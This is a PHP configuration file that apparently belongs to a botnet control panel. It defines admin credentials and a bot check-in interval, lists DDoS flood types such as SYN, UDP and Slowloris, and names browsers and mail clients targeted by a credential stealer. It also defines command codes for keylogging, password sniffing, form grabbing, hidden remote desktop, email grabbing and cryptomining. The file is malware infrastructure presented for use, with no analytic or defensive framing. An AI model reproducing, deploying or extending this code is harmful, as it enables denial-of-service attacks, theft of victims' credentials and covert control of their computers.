<?php

date_default_timezone_set("Europe/Berlin");	//timezone
ini_set("default_charset","windows-1251");	//charset

define("encryptkey",0xBAADF00D);		//set your encrypt key
define("decryptkey",0xDEADBEEF);		//set your decrypt key

$config["admin"] = "admin";	//admin login name
$config["pass"] = "password";	//admin password - must be changed
	
$config["guest"] = "secret";	//guest secret key - must be changed

$config["dbhost"] = "localhost";	//change only if other host required
$config["dbname"] = "";	//mysql database name
$config["dbuser"] = "";	//mysql database username
$config["dbpass"] = "";	//mysql databse password

$config["interval"] = 700;	//interval for check online bots - don't change
$config["cpname"] = "control.php";	//change this and rename "control.php" (recommend)
$config["gpname"] = "guest.php";	//change this and rename "guest.php" (recommend)

$config["auth"] = 0;	//0 - old basic-auth login, 1 - new web-login

//don't change below
$OS = array
(
	0 => "Windows XP",
	1 => "Windows 2003",
	2 => "Windows Vista",
	3 => "Windows 7",
	4 => "Windows 8",
	5 => "Windows 8.1",
	6 => "Windows 10",
	7 => "Other"
);

$plugins = array
(
	0 => 0,
	1 => 0,
	2 => 0,
	3 => 0,
	4 => 0,
	5 => 0,
	6 => 0,
	7 => 0,
	8 => 0,
	9 => 0,
	10 => 0,
	11 => 0,
	12 => 0,
	13 => 0
);

$ATTACK = array
(
	0 => "HTTP GET Flood",
	1 => "HTTP POST Flood",
	2 => "Download Flood",
	3 => "UDP Flood",
	4 => "SYN Flood",
	5 => "TCP Flood",
	6 => "HTTPS GET Flood",
	7 => "HTTP Slowloris Flood"
);

$STEALER = array
(
	1 => "Internet Explorer",
	2 => "Firefox",
	3 => "Chrome",
	4 => "Opera",
	5 => "Chromium",
	6 => "Yandex Browser",
	7 => "Amigo Browser",
	8 => "QQ Browser",
	9 => "Outlook",
	10 => "Thunderbird",
	11 => "Internet Explorer",
	12 => "Internet Explorer",
);

define("BASE",10000);
define("CMD_ONLINE",BASE + 1);
define("CMD_GETTASK",BASE + 2);
define("CMD_TASKRESULT",BASE + 3);
define("CMD_STEALERRESULT",BASE + 4);
define("CMD_PROCMON",BASE + 5);
define("CMD_PROCMONRESULT",BASE + 6);
define("CMD_FGRESULT",BASE + 7);
define("CMD_PASSSNIFRESULT",BASE + 8);
define("CMD_FSRESULT",BASE + 9);
define("CMD_DDOSRESULT",BASE + 10);
define("CMD_KEYLOGRESULT",BASE + 11);
define("CMD_HIDDENTV",BASE + 12);
define("CMD_HIDDENTVRESULT",BASE + 13);
define("CMD_MINER",BASE + 14);
define("CMD_EGRABBERRESULT",BASE + 15);
define("MAGIC",2018);

?>